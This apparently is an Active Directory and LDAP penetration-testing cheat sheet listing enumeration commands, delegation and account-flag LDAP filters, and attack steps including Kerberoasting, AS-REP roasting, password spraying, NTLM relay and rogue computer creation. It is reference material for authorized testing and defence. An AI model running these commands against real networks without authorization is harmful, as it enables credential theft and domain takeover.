
---
---

> **Gathering Information Anonymously**

```c
# Check for Anonymous Bind
ldapsearch -x -H ldap://10.10.10.10 -s base '(objectclass=*)'
ldapsearch -x -H ldap://10.10.10.10 -s base namingcontexts

# Get all objects (if allowed)
ldapsearch -x -H ldap://10.10.10.10 -b "DC=example,DC=local" "(objectClass=*)"

# Enumerate Users (anonymous)
ldapsearch -x -H ldap://10.10.10.10 -b "DC=example,DC=local" "(&(objectclass=user))" | grep sAMAccountName

# Enumerate Computers
ldapsearch -x -H ldap://10.10.10.10 -b "DC=example,DC=local" "(&(objectclass=computer))"

# Enumerate Groups
ldapsearch -x -H ldap://10.10.10.10 -b "DC=example,DC=local" "(&(objectclass=group))"

# windapsearch (Anonymous Bind)
python3 windapsearch.py --dc-ip 10.10.10.10 -u "" --functionality
python3 windapsearch.py --dc-ip 10.10.10.10 -u "" -U
python3 windapsearch.py --dc-ip 10.10.10.10 -u "" -C
python3 windapsearch.py --dc-ip 10.10.10.10 -u "" -G
python3 windapsearch.py --dc-ip 10.10.10.10 -u "" --policy

# Python ldap3
from ldap3 import Server, Connection
s = Server('10.10.10.10', get_info=ALL)
c = Connection(s, '', '')
c.bind()
print(s.info)

# Nmap LDAP scripts
nmap -p 389 --script "ldap* and not brute" 10.10.10.10
```

> **Gathering Information with an Account**

```c
# Windapsearch - Full Authenticated Enum
python3 windapsearch.py --dc-ip 10.10.10.10 -u 'DOMAIN\\user' -p 'Password123' --da

# Pull Specific Items
python3 windapsearch.py --dc-ip 10.10.10.10 -u 'DOMAIN\\user' -p 'Password123' -U
python3 windapsearch.py --dc-ip 10.10.10.10 -u 'DOMAIN\\user' -p 'Password123' -C
python3 windapsearch.py --dc-ip 10.10.10.10 -u 'DOMAIN\\user' -p 'Password123' -G

# Delegation Checks
python3 windapsearch.py --dc-ip 10.10.10.10 -u 'DOMAIN\\user' -p 'Password123' --delegation
python3 windapsearch.py --dc-ip 10.10.10.10 -u 'DOMAIN\\user' -p 'Password123' --unconstrained-users
python3 windapsearch.py --dc-ip 10.10.10.10 -u 'DOMAIN\\user' -p 'Password123' --trusted-for-delegation

# Password-not-required / Admin-count / GMSA
python3 windapsearch.py --dc-ip 10.10.10.10 -u 'DOMAIN\\user' -p 'Password123' --password-not-required
python3 windapsearch.py --dc-ip 10.10.10.10 -u 'DOMAIN\\user' -p 'Password123' --admin-count
python3 windapsearch.py --dc-ip 10.10.10.10 -u 'DOMAIN\\user' -p 'Password123' --gmsa

# ACL Enumeration
python3 windapsearch.py --dc-ip 10.10.10.10 -u 'DOMAIN\\user' -p 'Password123' --acl

# Trusts
python3 windapsearch.py --dc-ip 10.10.10.10 -u 'DOMAIN\\user' -p 'Password123' --trusts

# Group Memberships
python3 windapsearch.py --dc-ip 10.10.10.10 -u 'DOMAIN\\user' -p 'Password123' --group-memberships

# Kerberoasting (SPNs)
python3 windapsearch.py --dc-ip 10.10.10.10 -u 'DOMAIN\\user' -p 'Password123' --spn
python3 GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10

# ASREP-Roasting
python3 GetNPUsers.py domain.local/user:password -dc-ip 10.10.10.10 -request
crackmapexec ldap 10.10.10.10 -u users.txt -p '' --asreproast asreproast.out

# Password Policy
python3 ldapsearch-ad.py -l 10.10.10.10 -d domain.local -u user -p password -t pass-pols

# ldapsearch-ad - other queries
python3 ldapsearch-ad.py -l 10.10.10.10 -d domain.local -u user -p password -t users
python3 ldapsearch-ad.py -l 10.10.10.10 -d domain.local -u user -p password -t groups
python3 ldapsearch-ad.py -l 10.10.10.10 -d domain.local -u user -p password -t computers
python3 ldapsearch-ad.py -l 10.10.10.10 -d domain.local -u user -p password -t group-memberships
python3 ldapsearch-ad.py -l 10.10.10.10 -d domain.local -u user -p password -t trusts
python3 ldapsearch-ad.py -l 10.10.10.10 -d domain.local -u user -p password -t acl

# ldapdomaindump
ldapdomaindump 10.10.10.10 -u 'DOMAIN\\user' -p 'Password123' --no-json --no-grep -o /tmp/ldapdump

# nxc (NetExec)
nxc ldap 10.10.10.10 -u 'user' -p 'password' --users --groups --trusted-for-delegation --password-not-required --admin-count

# SID Enumeration
lookupsid.py domain.local/user:password@10.10.10.10
cme ldap 10.10.10.10 --get-sid

# Password Spraying Example
crackmapexec ldap 10.10.10.10 -u users.txt -p 'Summer2020' --no-bruteforce

# BloodHound
bloodhound.py -u user -p password -d domain.local -c All --zip -dc 10.10.10.10
Invoke-BloodHound -CollectionMethod All -ZipFileName data.zip

# NTLM Relay
python3 ntlmrelayx.py -t ldap://10.10.10.10 --delegate-access
python3 ntlmrelayx.py -t ldaps://10.10.10.10 --delegate-access

# Adding Computers (Priv Abuse)
python3 addcomputer.py -method LDAPS -dc-ip 10.10.10.10 -computer-name NEWPC -computer-pass Password123 domain.local/user:password

# SharpLDAPMonitor
SharpLDAPmonitor.exe /dcip:10.10.10.10 /user:DOMAIN\\user /pass:Password123

# CrackMapExec LDAP Modules (Advanced Recon)
crackmapexec ldap -M get-network
crackmapexec ldap -M laps
crackmapexec ldap -M maq
crackmapexec ldap -M daclread
crackmapexec ldap -M user-desc --options
crackmapexec ldap <IP> -u user -p password -M user-desc
```

> **Useful LDAP Filters for Delegation, Password Policy, and Recon**

```c
# Trusted for Delegation
'(userAccountControl:1.2.840.113556.1.4.803:=524288)'

# TrustedToAuthForDelegation (Protocol Transition)
'(userAccountControl:1.2.840.113556.1.4.803:=2097152)'

# Password Not Required
'(userAccountControl:1.2.840.113556.1.4.803:=32)'

# Don't Expire Password
'(userAccountControl:1.2.840.113556.1.4.803:=65536)'

# Smartcard Required
'(userAccountControl:1.2.840.113556.1.4.803:=262144)'

# Don't Require PreAuth (ASREP Roastable)
'(userAccountControl:1.2.840.113556.1.4.803:=4194304)'

# Encrypted Text Password Allowed
'(userAccountControl:1.2.840.113556.1.4.803:=128)'

# Disabled Accounts
'(userAccountControl:1.2.840.113556.1.4.803:=2)'

# Example PowerShell Usage
Get-ADComputer -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
Get-ADComputer -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=2097152)'
Get-ADUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=32)'
Get-ADUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
Get-ADUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=2)'
Get-ADUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=262144)'

# Example ldapsearch Usage
ldapsearch -x -H ldap://10.10.10.10 -b "DC=example,DC=local" '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
```

---
----
